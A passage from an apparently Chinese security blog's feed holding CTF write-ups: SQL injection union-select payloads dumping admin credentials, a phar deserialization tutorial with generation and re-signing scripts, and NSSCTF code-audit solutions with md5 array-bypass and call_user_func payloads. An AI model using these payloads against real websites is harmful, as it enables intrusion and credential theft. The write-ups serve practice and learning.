<code>order by</code> 找字段数，经查找，字段数为 10</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=170 order by 10</span><br></pre></td></tr></table></figure><p>本来想找回显点的，但是 <code>select</code>也被过滤了</p><p>于是尝试将 sql 语句放到 <code>cookie </code>里面进行传参，先测试一波发现可以访问</p><p>这里利用了谷歌上的一个插件 <code>ModHeader - Modify HTTP headers</code></p><p><img src="/../image/%E5%B0%A4%E9%87%8C%E7%9A%84%E5%A4%8D%E4%BB%87/2-2.png" alt="2-2"></p><p>继续猜测是否存在 admin 表（+号代替空格，不然会出错）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171+union+select+11,22,33,44,55,66,77,88,99,00+from+admin</span><br></pre></td></tr></table></figure><p>没有出错说明存在 admin 表，且出现了好几个有回显的位置</p><p><img src="/../image/%E5%B0%A4%E9%87%8C%E7%9A%84%E5%A4%8D%E4%BB%87/2-3.png" alt="2-3"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=171+union+select+11,username,password,44,55,66,77,88,99,00+from+admin</span><br></pre></td></tr></table></figure><p><img src="C:/Users/25189/AppData/Roaming/Typora/typora-user-images/image-20230314165101668.png" alt="image-20230314165101668"></p><p>得到用户名：admin  密码：b9a2a2b5dffb918c</p><p>根据题目描述后台是默认路径，所以直接访问 <code>admin </code>即网址后面加一个 admin</p><p>但是密码不对，这个密码应该用了某种编码，经过尝试是 md5</p><p>解码后输入用户名密码验证码成功得到 flag</p><h1 id="第三章：为了更多的权限！留言板"><a href="#第三章：为了更多的权限！留言板" class="headerlink" title="第三章：为了更多的权限！留言板"></a>第三章：为了更多的权限！留言板</h1><blockquote><p>Tips:</p><p>1、存储型Xss<br>2、flag在cookie里，格式为zkz{..}，xss bot 每10秒访问一次页面<br>3、自建Xss平台源码：<a href="http://hack.zkaq.cn/?t/99.html">http://hack.zkaq.cn/?t/99.html</a></p></blockquote><p>题目已经说了是 Xss 漏洞</p>]]></content>
    
    
      
      
    <summary type="html">&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;

&lt;h1 id=&quot;第一章：为了女神小芳！&quot;&gt;&lt;a href=&quot;#第一章：为了女神小芳！&quot; class=&quot;headerlink&quot; title=&quot;第一章：为了女神小芳！&quot;&gt;&lt;/a&gt;第一章：为了女神小芳！&lt;/h1&gt;&lt;blockquote&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>phar</title>
    <link href="https://s1ient.github.io/post/ce52afee.html"/>
    <id>https://s1ient.github.io/post/ce52afee.html</id>
    <published>2023-03-10T09:34:28.000Z</published>
    <updated>2023-05-10T05:57:59.647Z</updated>
    
    <content type="html"><![CDATA[<p>一些关于 phar 的介绍</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://www.php.net/manual/zh/wrappers.phar.php">官方文档</a></p><p>Phar 是在 PHP5 之后提供的一种类似于将代码打包的工具。本质上是想依照 Java 的 Jar 文件那种形式的代码包，不过本身由于 PHP 是不编译的，所以这个 Phar 实际上就是将代码原样的进行打包，不会进行编译。但是我们可以对打包的 Phar 包进行压缩操作。</p><h2 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h2><p><img src="/../image/phar/1-3.png" alt="1-3"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Stub    <span class="comment">//Phar文件头</span></span><br><span class="line">manifest<span class="comment">//压缩文件信息</span></span><br><span class="line">contents<span class="comment">//压缩文件内容</span></span><br><span class="line">signature<span class="comment">//签名</span></span><br></pre></td></tr></table></figure><h3 id="Stub"><a href="#Stub" class="headerlink" title="Stub"></a>Stub</h3><p>Stub 是 Phar 的文件标识，也可以理解为它就是 Phar 的文件头<br>这个Stub其实就是一个简单的PHP文件，它的格式具有一定的要求，具体如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="meta">&lt;?php</span> xxx; <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前面的内容是不限制的，但在该PHP语句中，必须有<code>__HALT_COMPILER()</code>，没有这个，PHP 就无法识别出它是 Phar 文件。</p><h3 id="manifest"><a href="#manifest" class="headerlink" title="manifest"></a>manifest</h3><p>用于存放文件的属性、权限等信息。<br>这里也是反序列化的攻击点，因为这里以序列化的形式存储了用户自定义的<code>Meta-data</code></p><p><img src="/../image/phar/1-4.png" alt="1-4"></p><h3 id="contents"><a href="#contents" class="headerlink" title="contents"></a>contents</h3><p>用于存放Phar文件的内容</p><h3 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h3><p>签名(可选参数)，位于文件末尾，具体格式如下</p><p><img src="/../image/phar/1-5.png" alt="1-5"></p><p>签证尾部的<code>01</code>代表 md5 加密，<code>02</code>代表 sha1 加密，<code>04</code>代表 sha256 加密，<code>08</code>代表 sha512 加密</p><p>当我们修改文件的内容时，签名就会变得无效，这个时候需要更换一个新的签名<br>更换签名的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.phar&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    f = file.read() </span><br><span class="line">s = f[:-<span class="number">28</span>] <span class="comment"># 获取要签名的数据</span></span><br><span class="line">h = f[-<span class="number">8</span>:] <span class="comment"># 获取签名类型和GBMB标识</span></span><br><span class="line">newf = s + sha1(s).digest() + h <span class="comment"># 数据 + 签名 + (类型 + GBMB)</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newtest.phar&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(newf) <span class="comment"># 写入新文件</span></span><br></pre></td></tr></table></figure><h1 id="本地实现"><a href="#本地实现" class="headerlink" title="本地实现"></a>本地实现</h1><p>要想使用 phar，就得要现在 php.ini 里面将 phar.readonly 设置为 off</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/4-4.png" alt="4-4"></p><p>phar.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;S1ient&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>访问 phar.php，在同一目录下得到 phar.phar</p><p><img src="/../image/phar/1-1.png" alt="1-1"></p><p>phar_fan.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/phar/1-2.png" alt="1-2"></p><h1 id="在-ctf-中的使用"><a href="#在-ctf-中的使用" class="headerlink" title="在 ctf 中的使用"></a>在 ctf 中的使用</h1><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>Phar之所以能反序列化，是因为Phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>,PHP使用<code>phar_parse_metadata</code>在解析meta数据时，会调用<code>php_var_unserialize</code>进行反序列化操作。</p><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">phar文件能够上传至服务器 </span><br><span class="line"><span class="comment">//即要求存在file_get_contents()、fopen()这种函数</span></span><br><span class="line"></span><br><span class="line">要有可利用的魔术方法</span><br><span class="line"><span class="comment">//这个的话用一位大师傅的话说就是利用魔术方法作为&quot;跳板&quot;</span></span><br><span class="line"></span><br><span class="line">文件操作函数的参数可控，且 : 和 / 和 phar 等特殊字符没有被过滤</span><br><span class="line"><span class="comment">//一般利用姿势是上传Phar文件后通过伪协议Phar来实现反序列化，伪协议Phar格式是`Phar://`这种，如果这几个特殊字符被过滤就无法实现反序列化</span></span><br><span class="line"></span><br><span class="line">php.ini 中的 phar.<span class="keyword">readonly</span> 选项，需要为 Off（默认是<span class="keyword">on</span>）。</span><br></pre></td></tr></table></figure><p>Phar属于伪协议，伪协议使用较多的是一些文件操作函数，如<code>fopen()</code>、<code>copy()</code>、<code>file_exists()</code>等，具体如下图，也就是下面的函数如果参数可控可以造成Phar反序列化</p><table><thead><tr><th align="center">is_dir</th><th align="center">is_file</th><th align="center">is_link</th><th align="center">copy</th></tr></thead><tbody><tr><td align="center">file</td><td align="center">stat</td><td align="center">readfile</td><td align="center">unlink</td></tr><tr><td align="center">filegroup</td><td align="center">fileinode</td><td align="center">fileatime</td><td align="center">filectime</td></tr><tr><td align="center">fopen</td><td align="center">filemtime</td><td align="center">fileowner</td><td align="center">fileperms</td></tr><tr><td align="center">file_exists</td><td align="center">file_get_contents</td><td align="center">file_putcontents</td><td align="center">is_executable</td></tr><tr><td align="center">is_readable</td><td align="center">is_writable</td><td align="center">is_writeable</td><td align="center">parse_ini_file</td></tr></tbody></table><h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); <span class="comment">//开始缓冲 Phar 写操作</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，stub是一个简单的php文件。PHP通过stub识别一个文件为PHAR文件，可以利用这点绕过文件上传检测</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;S1ient&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算，停止缓冲对 Phar 归档的写入请求，并将更改保存到磁盘</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>[CISCN 2019华北Day1]Web1</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;一些关于 phar 的介绍&lt;/p&gt;</summary>
    
    
    
    <category term="php" scheme="https://s1ient.github.io/categories/php/"/>
    
    
    <category term="php" scheme="https://s1ient.github.io/tags/php/"/>
    
    <category term="phar" scheme="https://s1ient.github.io/tags/phar/"/>
    
  </entry>
  
  <entry>
    <title>NSSCTF-php代码审计</title>
    <link href="https://s1ient.github.io/post/646af47d.html"/>
    <id>https://s1ient.github.io/post/646af47d.html</id>
    <published>2023-03-09T13:26:09.000Z</published>
    <updated>2023-05-10T05:57:59.657Z</updated>
    
    <content type="html"><![CDATA[<p>NSSCTF 上写的几道代码审计题目</p><span id="more"></span><h1 id="SWPUCTF-2022-新生赛-奇妙的MD5"><a href="#SWPUCTF-2022-新生赛-奇妙的MD5" class="headerlink" title="[SWPUCTF 2022 新生赛]奇妙的MD5"></a>[SWPUCTF 2022 新生赛]奇妙的MD5</h1><p>哈哈，我还真没听过…</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/1-1.png" alt="1-1"></p><blockquote><p>ffifdyop</p><p>经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b</p><p>用途：</p><p>select * from admin where password&#x3D;’’or’6&lt;乱码&gt;’</p><p>就相当于select * from admin where password&#x3D;’’or 1  实现sql注入</p></blockquote><p>输入进去，页面提示在哪里找找线索，那自然是右键查看源代码</p><p>最上面看到 php 代码，一个简单的 md5 若碰撞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$x</span>= <span class="variable">$GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="variable">$y</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span> != <span class="variable">$y</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$x</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$y</span>))&#123;</span><br><span class="line">    ;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?x[]=x&amp;&amp;y[]=y</span><br></pre></td></tr></table></figure><p>得到另一个 php 代码，post 传参的 md5 强碰撞,没有对参数字符串化，还是可以数组绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;wqh&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dsy&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wqh[]=x&amp;&amp;dsy[]=y</span><br></pre></td></tr></table></figure><h1 id="SWPUCTF-2022-新生赛-numgame"><a href="#SWPUCTF-2022-新生赛-numgame" class="headerlink" title="[SWPUCTF 2022 新生赛]numgame"></a>[SWPUCTF 2022 新生赛]numgame</h1><p>页面就一个计算的东西，但是无论如何也到不了 20，本来想着 F12，但是打不开，Ctrl+Shift+I 直接退出了页面</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2-1.png" alt="2-1"></p><p>越是不要我看我就要看！直接 bp 抓包，看到了一个 js 文件</p><p><img src="/../image/NSSCTF-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2-2.png" alt="2-2"></p><p>访问一下，最后一行得到</p><blockquote><p>NSSCTF{TnNTY1RmLnBocA&#x3D;&#x3D;}</p></blockquote><p>base64 解码得到</p><blockquote><p>NsScTf.php</p></blockquote><p>访问得到 php 代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//hint: 与get相似的另一种请求协议是什么呢</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nss</span></span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">ctf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;./hint2.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/n|c/m&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="variable">$matches</span>))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第 3 行与 get 相似那就是 post，看样子是要 get 和 post 同时传入 p</p><p>第  7 行，访问 hint2.php 得到提示</p><blockquote><p>有没有一种可能，类是nss2</p></blockquote><p>第 11 行不允许 p 里面出现 n 或 c，不能有 m，但是只匹配了小写，可以大小写绕过</p><p>第 13 行，<a href="https://www.php.net/manual/zh/function.call-user-func.php">call_user_func</a> 函数，从示例四这里可以得到有效信息</p><img src="../image/NSSCTF-php代码审计/2-3.png" alt="2-3"  /><p>我们这里的情况类似于第 13 行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$classname</span> .<span class="string">&#x27;::say_hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$myobject</span> = <span class="keyword">new</span> <span class="title function_ invoke__">myclass</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="variable">$myobject</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>类名是 nss2，方法名是 ctf</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=Nss2::Ctf</span><br></pre></td></tr></table></figure><p>传入后 F12 得到 flag，这个我还以为出错了….</p><h1 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="[HCTF 2018]Warmup"></a>[HCTF 2018]Warmup</h1><p>F12 得到 <code>source.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span 